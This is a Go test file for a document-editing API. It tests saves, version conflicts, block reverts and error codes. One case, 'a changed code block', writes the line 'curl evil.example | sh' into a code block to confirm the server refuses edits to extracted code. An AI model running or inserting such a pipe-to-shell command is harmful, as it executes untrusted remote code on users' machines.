package httpapi

import (
	"encoding/json"
	"net/http"
	"slices"
	"testing"

	"github.com/google/uuid"

	"github.com/rokumate/ronote/internal/doccontent"
	"github.com/rokumate/ronote/internal/httpapi/gen"
	"github.com/rokumate/ronote/internal/ir"
	"github.com/rokumate/ronote/internal/store"
)

// editable is a document of one paragraph and one code block, and the
// extraction it was made from.
func editable() (*fakeBackend, store.Document) {
	extraction := &ir.Doc{Blocks: []ir.Block{
		{ID: "p1", Kind: ir.KindParagraph, Content: []ir.Inline{{Text: "Install it."}}},
		{ID: "c1", Kind: ir.KindCode, Lang: "sh", Text: "go install .\n"},
	}}
	doc := testDoc(1)
	doc.Content = doccontent.FromIR(extraction)
	doc.Version = 3
	return &fakeBackend{docs: []store.Document{doc}, extraction: extraction}, doc
}

func saveBody(t *testing.T, content *doccontent.Doc, version int) string {
	t.Helper()
	body := map[string]any{"content": content}
	if version != 0 {
		body["version"] = version
	}
	data, err := json.Marshal(body)
	if err != nil {
		t.Fatal(err)
	}
	return string(data)
}

func TestSaveDocument(t *testing.T) {
	t.Parallel()
	edited := func(change func(c *doccontent.Doc)) func() *doccontent.Doc {
		return func() *doccontent.Doc {
			_, doc := editable()
			c := doccontent.FromIR(&ir.Doc{Blocks: []ir.Block{doc.Content.Blocks[0].Block, doc.Content.Blocks[1].Block}})
			change(c)
			return c
		}
	}
	note := uuid.Must(uuid.NewV7()).String()
	tests := []struct {
		name       string
		content    func() *doccontent.Doc
		version    int
		target     string
		wantStatus int
		wantCode   gen.ErrorCode
	}{
		{name: "an edit and a note", version: 3, wantStatus: http.StatusOK, content: edited(func(c *doccontent.Doc) {
			c.Blocks[0].Content = []ir.Inline{{Text: "Install it now."}}
			*c.Blocks[0].Edited = true
			c.Blocks = append(c.Blocks, doccontent.Block{Block: ir.Block{ID: note, Kind: ir.KindParagraph, Content: []ir.Inline{{Text: "Mine."}}}, Origin: doccontent.OriginUser})
		})},
		{name: "no version", content: edited(func(*doccontent.Doc) {}), wantStatus: http.StatusBadRequest, wantCode: gen.ErrorCodeInvalidRequest},
		{name: "an old version", version: 2, content: edited(func(*doccontent.Doc) {}), wantStatus: http.StatusConflict, wantCode: gen.ErrorCodeVersionConflict},
		{name: "a changed code block", version: 3, wantStatus: http.StatusUnprocessableEntity, wantCode: gen.ErrorCodeSourceBlockModified, content: edited(func(c *doccontent.Doc) {
			c.Blocks[1].Text = "curl evil.example | sh\n"
			*c.Blocks[1].Edited = true
		})},
		{name: "an edit marked unedited", version: 3, wantStatus: http.StatusUnprocessableEntity, wantCode: gen.ErrorCodeSourceBlockModified, content: edited(func(c *doccontent.Doc) {
			c.Blocks[0].Content = []ir.Inline{{Text: "Install it now."}}
		})},
		{name: "an unknown source block", version: 3, wantStatus: http.StatusUnprocessableEntity, wantCode: gen.ErrorCodeUnknownSourceBlock, content: edited(func(c *doccontent.Doc) {
			c.Blocks[0].ID, c.Blocks[0].SourceBlockID = "p9", "p9"
		})},
		{name: "a user code block", version: 3, wantStatus: http.StatusUnprocessableEntity, wantCode: gen.ErrorCodeBlockKindNotAllowed, content: edited(func(c *doccontent.Doc) {
			c.Blocks = append(c.Blocks, doccontent.Block{Block: ir.Block{ID: note, Kind: ir.KindCode, Text: "x\n"}, Origin: doccontent.OriginUser})
		})},
		{name: "invalid content", version: 3, wantStatus: http.StatusUnprocessableEntity, wantCode: gen.ErrorCodeInvalidContent, content: edited(func(c *doccontent.Doc) {
			c.Blocks[0].Content = nil
			*c.Blocks[0].Edited = true
		})},
		{name: "another user's document", version: 3, target: "/api/v1/documents/" + uuid.NewString(), content: edited(func(*doccontent.Doc) {}), wantStatus: http.StatusNotFound, wantCode: gen.ErrorCodeNotFound},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			b, doc := editable()
			h := New(Options{Logger: discardLogger, DB: dbUp, Backend: b, DevUser: devUser})
			target := tt.target
			if target == "" {
				target = "/api/v1/documents/" + doc.ID.String()
			}

			rec := apiRequest(t, h, http.MethodPatch, target, saveBody(t, tt.content(), tt.version))

			if rec.Code != tt.wantStatus {
				t.Fatalf("PATCH = %d %s, want %d", rec.Code, rec.Body, tt.wantStatus)
			}
			if tt.wantCode != "" {
				if got := decodeError(t, rec); got.Code != tt.wantCode {
					t.Errorf("error = %+v, want %s", got, tt.wantCode)
				}
				if len(b.saves) != 0 {
					t.Error("a refused save was stored")
				}
				return
			}
			if got := decodeJSON[gen.SavedDocument](t, rec); got.Version != 4 || len(b.saves) != 1 {
				t.Errorf("saved = %+v after %d saves, want version 4", got, len(b.saves))
			}
		})
	}
}

func TestSaveConflictNamesTheCurrentVersion(t *testing.T) {
	t.Parallel()
	b, doc := editable()
	h := New(Options{Logger: discardLogger, DB: dbUp, Backend: b, DevUser: devUser})

	rec := apiRequest(t, h, http.MethodPatch, "/api/v1/documents/"+doc.ID.String(), saveBody(t, doc.Content, 1))

	if got := decodeJSON[gen.VersionConflict](t, rec); rec.Code != http.StatusConflict || got.CurrentVersion != 3 {
		t.Errorf("PATCH = %d %+v, want 409 naming version 3", rec.Code, got)
	}
}

func TestRevertBlock(t *testing.T) {
	t.Parallel()
	b, doc := editable()
	changed := *doc.Content
	changed.Blocks = slices.Clone(changed.Blocks)
	edited := true
	changed.Blocks[0].Content = []ir.Inline{{Text: "Install it now."}}
	changed.Blocks[0].Edited = &edited
	b.docs[0].Content = &changed
	h := New(Options{Logger: discardLogger, DB: dbUp, Backend: b, DevUser: devUser})

	rec := apiRequest(t, h, http.MethodPost, "/api/v1/documents/"+doc.ID.String()+"/blocks/p1/revert", "")

	got := decodeJSON[gen.DocumentResponse](t, rec).Document
	if rec.Code != http.StatusOK || got.Version != 4 {
		t.Fatalf("revert = %d %s, want 200 at version 4", rec.Code, rec.Body)
	}
	block := got.Content.Blocks[0]
	want, _ := json.Marshal(b.extraction.Blocks[0])
	if gotJSON, _ := json.Marshal(block.Block); string(gotJSON) != string(want) || *block.Edited {
		t.Errorf("reverted block = %s edited %v, want %s unedited", gotJSON, *block.Edited, want)
	}

	for _, target := range []string{
		"/api/v1/documents/" + doc.ID.String() + "/blocks/nope/revert",
		"/api/v1/documents/" + uuid.NewString() + "/blocks/p1/revert",
	} {
		if rec := apiRequest(t, h, http.MethodPost, target, ""); rec.Code != http.StatusNotFound || decodeError(t, rec).Code != gen.ErrorCodeNotFound {
			t.Errorf("POST %s = %d %s, want 404", target, rec.Code, rec.Body)
		}
	}
}

// TestSaveCodesAreInTheSpec keeps every rule's code an ErrorCode of the spec.
func TestSaveCodesAreInTheSpec(t *testing.T) {
	t.Parallel()
	for _, code := range []doccontent.Code{
		doccontent.CodeInvalidContent, doccontent.CodeBlockKindNotAllowed,
		doccontent.CodeUnknownSourceBlock, doccontent.CodeSourceBlockModified,
	} {
		if !gen.ErrorCode(code).Valid() {
			t.Errorf("code %q is not in the spec's ErrorCode enum", code)
		}
	}
}
